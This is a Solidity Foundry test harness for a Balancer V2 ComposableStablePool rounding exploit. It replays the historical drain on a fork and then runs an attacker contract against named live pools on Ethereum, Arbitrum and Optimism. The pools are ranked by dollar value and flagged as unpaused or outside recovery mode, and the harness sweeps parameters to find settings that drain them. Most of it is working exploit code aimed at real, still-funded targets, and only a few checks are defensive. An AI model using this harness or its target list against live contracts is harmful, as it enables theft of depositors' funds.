// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/interfaces.sol";
import "../src/Attacker.sol";

/// Fork-only PoC harness for the 2025-11 Balancer V2 ComposableStablePool rounding exploit.
/// Read-only w.r.t. mainnet: every attack runs on a local fork of a public RPC.
contract BalancerV2AttackTest is Test {
    IBalancerVault constant vault = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    address constant BENEFICIARY = address(0xBEEF00000000000000000000000000000000BEEf);

    string constant ETH_RPC = "https://ethereum-rpc.publicnode.com";

    function _ethFork() internal returns (uint256) {
        return vm.createSelectFork(vm.envOr("FORK_RPC_URL", vm.envOr("RPC_URL", string(ETH_RPC))));
    }

    function _forkOf(string memory envName, string memory fallbackUrl) internal returns (uint256) {
        return vm.createSelectFork(vm.envOr(envName, fallbackUrl));
    }

    function _bal(address token, address who) internal view returns (uint256) {
        return IERC20(token).balanceOf(who);
    }

    /// Run the attack once with given params; captures revert reason for diagnosis.
    function _attempt(address pool, uint256 initBalance, uint256 loops)
        internal
        returns (bool ok, address[] memory tokens, uint256[] memory gains, string memory reason)
    {
        bytes32 poolId = ICSP(pool).getPoolId();
        (tokens, , ) = vault.getPoolTokens(poolId);
        uint256[] memory before = new uint256[](tokens.length);
        for (uint256 i = 0; i < tokens.length; i++) before[i] = _bal(tokens[i], BENEFICIARY);

        AttackerC att = new AttackerC();
        try att.attack(pool, initBalance, loops) {
            att.withdraw(pool, BENEFICIARY);
            ok = true;
        } catch Error(string memory r) {
            reason = r;
        } catch (bytes memory data) {
            reason = data.length >= 4 ? string(abi.encodePacked("custom:", _toHex(data[0]), _toHex(data[1]), _toHex(data[2]), _toHex(data[3]))) : "custom";
        }
        gains = new uint256[](tokens.length);
        for (uint256 i = 0; i < tokens.length; i++) {
            uint256 nowBal = _bal(tokens[i], BENEFICIARY);
            gains[i] = nowBal > before[i] ? nowBal - before[i] : 0;
        }
    }

    function _toHex(bytes1 b) internal pure returns (bytes2) {
        bytes memory alphabet = "0123456789abcdef";
        uint8 v = uint8(b);
        return bytes2(abi.encodePacked(alphabet[v >> 4], alphabet[v & 0x0f]));
    }

    function _logPoolState(address pool, string memory tag) internal {
        bytes32 poolId = ICSP(pool).getPoolId();
        (address[] memory tokens, uint256[] memory balances, ) = vault.getPoolTokens(poolId);
        emit log_named_string("pool_tag", tag);
        emit log_named_address("pool", pool);
        for (uint256 i = 0; i < tokens.length; i++) {
            emit log_named_address("  token", tokens[i]);
            emit log_named_uint("  balance", balances[i]);
        }
    }

    /// Try a grid of init balances against a candidate pool, reverting state between attempts.
    function _tryPool(address pool, uint256 loops) internal {
        bytes32 poolId = ICSP(pool).getPoolId();
        (address[] memory tokens, uint256[] memory balances, ) = vault.getPoolTokens(poolId);
        uint256 bptIndex;
        uint256[] memory sf;
        try ICSP(pool).getBptIndex() returns (uint256 b) {
            bptIndex = b;
        } catch {
            emit log_named_string("skip", "no getBptIndex (not composable)");
            return;
        }
        if (tokens.length != 3) {
            emit log_named_string("skip", "not a 3-token pool");
            return;
        }
        try ICSP(pool).getScalingFactors() returns (uint256[] memory s) {
            sf = s;
        } catch {
            emit log_named_string("skip", "no scaling factors");
            return;
        }
        uint256 idx = 0;
        uint256 maxBal = 0;
        for (uint256 i = 0; i < tokens.length; i++) {
            if (i == bptIndex) continue;
            if (balances[i] > maxBal) {
                maxBal = balances[i];
                idx = i;
            }
        }
        if (sf[idx] <= 1e18) {
            emit log_named_string("skip", "pivot has no rate (sf<=1e18)");
            return;
        }
        uint256[6] memory inits;
        uint256 n = 0;
        if (maxBal > 1e8) inits[n++] = maxBal / 1e6;
        if (maxBal > 1e12) inits[n++] = maxBal / 1e10;
        if (maxBal > 1e16) inits[n++] = maxBal / 1e14;
        if (maxBal > 1e18) inits[n++] = maxBal / 1e16;
        inits[n++] = 1e9;
        for (uint256 k = 0; k < n; k++) {
            uint256 init = inits[k];
            if (init == 0 || init >= maxBal) continue;
            uint256 snap = vm.snapshotState();
            (bool ok, , uint256[] memory gains, string memory reason) = _attempt(pool, init, loops);
            if (ok) {
                emit log_named_uint("attempt_init", init);
                emit log_named_string("attempt", "SUCCESS");
                for (uint256 i = 0; i < gains.length; i++) {
                    if (gains[i] > 0) {
                        emit log_named_address("  gain_token", tokens[i]);
                        emit log_named_uint("  gain", gains[i]);
                    }
                }
            } else {
                emit log_named_uint("attempt_init_reverted", init);
                emit log_named_string("  revert_reason", reason);
            }
            vm.revertToState(snap);
        }
    }

    /// External wrappers so per-pool failures are caught and logged instead of failing the suite.
    function tryPoolExternal(address pool, uint256 loops) external {
        _tryPool(pool, loops);
    }

    function logStateExternal(address pool, string memory tag) external {
        _logPoolState(pool, tag);
    }

    /// End-to-end validation of the harness on the historical hack block (archive RPC required).
    /// Set HIST_RPC_URL (e.g. an archive endpoint) to run; skipped otherwise.
    function test_historical_sanity() public {
        string memory url = vm.envOr("HIST_RPC_URL", string(""));
        if (bytes(url).length == 0) {
            emit log_named_string("historical", "skipped (HIST_RPC_URL unset)");
            return;
        }
        vm.createSelectFork(url, 23717396);
        AttackerC att = new AttackerC();
        att.attack(0xDACf5Fa19b1f720111609043ac67A9818262850c, 67000, 30);
        att.withdraw(0xDACf5Fa19b1f720111609043ac67A9818262850c, BENEFICIARY);
        att.attack(0x93d199263632a4EF4Bb438F1feB99e57b4b5f0BD, 100000000000, 25);
        att.withdraw(0x93d199263632a4EF4Bb438F1feB99e57b4b5f0BD, BENEFICIARY);
        emit log_named_uint("hist_WETH", _bal(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, BENEFICIARY));
        emit log_named_uint("hist_osETH", _bal(0xf1C9acDc66974dFB6dEcB12aA385b9cD01190E38, BENEFICIARY));
        emit log_named_uint("hist_wstETH", _bal(0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0, BENEFICIARY));
    }

    /// Ethereum: live CSPs with real rate providers, not paused, ranked by USD (2026-10-04 state).
    function test_current_ethereum_candidates() public {
        _ethFork();
        address[10] memory pools = [
            0xaE8535c23afeDdA9304B03c68a3563B75fc8f92b, // v5, recovery, swETH 167 + bb-a-WETH 33 (~$600k)
            0x4CbdE5C4B4B53EBE4aF4adB85404725985406163, // v5, recovery, ETHx 104 + bb-a-WETH 90 (~$550k)
            0x02D928E68D8F10C0358566152677Db51E1e2Dc8C, // v3, recovery, swETH 9.2 ($28k)
            0xE7e2c68d3b13d905BBb636709cF4DfD21076b9D2, // v5, no-recovery, WETH 122.7 ($331k) pivot swETH=3 wei
            0x09B03b7cBB19b3daE94F884cF60dBc3c99a3947b, // v5, no-recovery, PYUSD/sDOLA ($155)
            0x74E5E53056526b2609d82E85486005EF2A2Db001, // v5, no-recovery, MATIC/TruMATIC (~$12)
            0xB54E6AADBF1ac1a3EF2A56E358706F0f8E320a03, // v5, no-recovery, rETH/WETH (small)
            0xdD59f89B5B07B7844d72996fC9d83D81acC82196, // v5, no-recovery, WETH/sfrxETH (small)
            0x50359088f666a9E70DC00B565Ecd9F853a572c7c, // v5, no-recovery, WETH/osETH (small)
            0x596192bb6e41802428Ac943D2F1476C1Af25cCbE  // v5, no-recovery, ezETH/WETH (small)
        ];
        for (uint256 i = 0; i < pools.length; i++) {
            emit log_named_string("=== candidate ===", "");
            try this.logStateExternal(pools[i], "candidate") {} catch {}
            try this.tryPoolExternal(pools[i], 15) {} catch Error(string memory r) { emit log_named_string("pool_revert", r); } catch {}
        }
    }

    function test_current_arbitrum_candidates() public {
        _forkOf("ARB_RPC_URL", "https://arbitrum-one-rpc.publicnode.com");
        address[5] memory pools = [
            0xFB2f7eD572589940e24c5711c002aDC59D5e79Ef, // v5, no-recovery, SOL/JitoSOL (~$26k)
            0xCba9Ff45cfB9cE238AfDE32b0148Eb82CbE63562, // v3, recovery, rETH ($5.4k)
            0xBe0f30217BE1e981aDD883848D0773A86d2d2CD4, // v5, recovery, rETH ($3.2k)
            0x5A7f39435fD9c381e4932fa2047C9a5136A5E3E7, // v3, recovery, wstETH ($2k)
            0x0c8972437a38b389ec83d1E666b69b8a4fcf8bfd  // v5, no-recovery, wstETH/sfrxETH/rETH ($63)
        ];
        for (uint256 i = 0; i < pools.length; i++) {
            emit log_named_string("=== arb candidate ===", "");
            try this.logStateExternal(pools[i], "candidate") {} catch {}
            try this.tryPoolExternal(pools[i], 15) {} catch Error(string memory r) { emit log_named_string("pool_revert", r); } catch {}
        }
    }

    function test_current_optimism_candidates() public {
        _forkOf("OP_RPC_URL", "https://optimism-rpc.publicnode.com");
        address[4] memory pools = [
            0x62cF35DB540152e94936dE63eFc90d880D4e241B, // v5, recovery, ERN/bb-rf (~$26)
            0x10D89732C7e3c5b548e766805b40bC0ECdca4499, // v5, no-recovery, rsETH/WETH (~$11)
            0x73A7fe27fe9545D53924E529Acf11F3073841b9e, // v5, no-recovery, WETH/wrsETH (~$9)
            0x5F8893506Ddc4C271837187d14A9C87964a074Dc  // v5, no-recovery, wstETH/sfrxETH/rETH (~$6)
        ];
        for (uint256 i = 0; i < pools.length; i++) {
            emit log_named_string("=== op candidate ===", "");
            try this.logStateExternal(pools[i], "candidate") {} catch {}
            try this.tryPoolExternal(pools[i], 15) {} catch Error(string memory r) { emit log_named_string("pool_revert", r); } catch {}
        }
    }

    /// Sanity: the two pools drained on 2025-11-03 hold only dust now.
    function test_drained_pools_have_no_value() public {
        _ethFork();
        address[2] memory pools = [
            0xDACf5Fa19b1f720111609043ac67A9818262850c, // osETH/WETH
            0x93d199263632a4EF4Bb438F1feB99e57b4b5f0BD  // wstETH/WETH
        ];
        for (uint256 i = 0; i < pools.length; i++) {
            (address[] memory tokens, uint256[] memory balances, ) = vault.getPoolTokens(ICSP(pools[i]).getPoolId());
            for (uint256 j = 0; j < tokens.length; j++) {
                if (tokens[j] == pools[i]) continue;
                emit log_named_address("token", tokens[j]);
                emit log_named_uint("balance", balances[j]);
            }
        }
    }

    /// v6 (pausable) pools with value must revert on swap while paused.
    function test_v6_paused_pool_swap_reverts() public {
        _ethFork();
        address pool = 0xC5B3F108024da9776D024fD9CEFa4b48e021f1A2; // CSP v6, paused
        _logPoolState(pool, "v6_paused");
        IBalancerVault.SingleSwap memory s = IBalancerVault.SingleSwap({
            poolId: ICSP(pool).getPoolId(),
            kind: IBalancerVault.SwapKind.GIVEN_IN,
            assetIn: 0x83F20F44975D03b1b09e64809B757c47f942BEeA, // sDAI
            assetOut: 0x7945B0A6d89D3A44c7B77e5C8B28c02E0E1B0c9F, // placeholder resolved below
            amount: 1e15,
            userData: bytes("")
        });
        (address[] memory tokens, , ) = vault.getPoolTokens(s.poolId);
        s.assetOut = tokens[0] == s.assetIn ? tokens[1] : tokens[0];
        try vault.swap(
            s,
            IBalancerVault.FundManagement({
                sender: address(this),
                fromInternalBalance: false,
                recipient: payable(address(this)),
                toInternalBalance: false
            }),
            0,
            block.timestamp
        ) {
            emit log_named_string("v6_swap", "SUCCEEDED (pause not enforced?)");
        } catch Error(string memory reason) {
            emit log_named_string("v6_swap_revert_reason", reason);
        } catch (bytes memory data) {
            emit log_named_bytes("v6_swap_revert_data", data);
        }
    }
}
